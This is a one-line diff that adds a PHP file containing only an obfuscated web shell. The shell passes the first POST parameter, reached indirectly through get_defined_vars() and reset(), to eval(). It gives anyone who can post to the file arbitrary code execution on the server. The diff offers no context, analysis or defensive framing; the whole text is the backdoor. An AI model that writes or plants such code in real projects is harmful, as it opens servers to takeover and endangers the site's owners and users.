@@ -1,0 +1,1 @@
+<?php $a['b']="";eval($a['a'].reset(get_defined_vars()[_POST]));?>
